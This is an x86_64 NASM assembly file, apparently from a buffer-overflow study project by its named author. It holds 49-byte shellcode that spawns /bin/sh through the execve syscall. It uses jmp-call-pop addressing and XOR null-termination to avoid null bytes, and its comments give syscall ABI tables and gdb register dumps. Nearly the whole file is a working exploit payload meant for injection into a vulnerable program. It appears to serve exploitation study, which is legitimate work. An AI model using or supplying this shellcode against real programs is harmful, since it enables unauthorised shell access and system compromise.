
; This is for bof.c
; It is the x86_64 version of testya5.asm from the i386 notes
; It is in nasm64 assembly.  It has been tweaked to use some methods
; from un1k0d3r's code in the paper.  However, it gets a shell
; instead of read/write /etc/passwd to stdout.
; This shell code is 49 bytes in length
; John F. Davis davisjf@gmail.com

; vim/syntastic notes
; This is annoying, but everytime I write the file in vim, I need to do
; :SyntasticCheck nasm64
; This only needs to be done once, but it sets syntax high lighting correctly
; :set filetype=nasm


; From man page on syscall
;
;  arch/ABI   instruction          syscall #   retval Notes
;  ───────────────────────────────────────────────────────────────────
;  x86_64     syscall              rax         rax    See below
;
;
;  arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
;  ──────────────────────────────────────────────────────────────────
;  x86_64        rdi   rsi   rdx   r10   r8    r9    -
;


	jmp theCall

; Release the kracken
theKracken:
	pop rdi		; ARG1, rdi is a pointer to string

; this is our goal.
;
; (gdb) print /x $rax
; $3 = 0x3b                       system call number - execv 59 or 0x3B
; (gdb) print /x $rdi
; $4 =  0x7fffffffde92 
; (gdb) print /x $rsi
; $5 = 0xbffff37c                pointer to pointer to string
; (gdb) print /x $rdx
; $6 = 0x0						 null pointer
; (gdb) x/4w 0xbffff374
; 0xbffff374:     0x6e69622f      0x0068732f      0xbffff374      0x00000000


; Prepare execv parms in the regs per abi
; Load the string pointers for parm 1 and 2
; nasm assembly uses Intel style for mov's where its dst, src
;
	xor byte [rdi+7], 0x41	; write zero to offset 7 byte to null term the string
; function args
; rdi is already set
	lea rax, [rdi]
	mov [rdi+8], rax 		; write address to memory.
	mov rsi, rdi			; 
	add rsi, 0x8			; ARG2, rsi now is a pointer to pointer to string.
; set nulls
	xor rdx, rdx			; ARG3, rdx is null 
	mov [rdi+16], rdx 	    ; write null to word following pointer to pointer


; Load the execv system call
	xor rax, rax ; eax is zero again
	add rax, 0x3b ; now its the execv syscall
; Do a system call
	syscall 
	


theCall:
	call theKracken

; use unlcoders technique for doing null term string.  Rather than writing a zero
; he stores a 'A' and then xors it to zero.
execvCmdString: db '/bin/sh',0x41


